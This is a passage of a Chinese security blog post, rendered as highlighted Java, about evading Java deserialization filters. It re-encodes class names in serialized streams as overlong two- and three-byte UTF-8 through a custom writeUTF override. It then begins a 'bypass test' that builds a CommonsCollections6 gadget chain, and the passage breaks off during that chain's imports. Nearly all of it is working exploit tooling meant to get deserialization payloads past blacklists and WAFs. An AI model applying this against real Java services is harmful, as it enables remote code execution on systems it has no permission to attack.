<span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeUTF</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//写入name（jdk原生写入方法）</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//写入name(两个字节表示一个字符)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//写入name(三个字节表示一个字符)</span><br>        charWriteThreeBytes(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过测试"><a href="#绕过测试" class="headerlink" title="绕过测试"></a>绕过测试</h2><p>这里直接打一个普通cc6的链子来测试是否可用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.overlong;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.clown.Utils.CustomObjectOutputStream;<br><span class="hljs-keyword">import</span> org.clown.Utils.UTF8OutputStream;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> 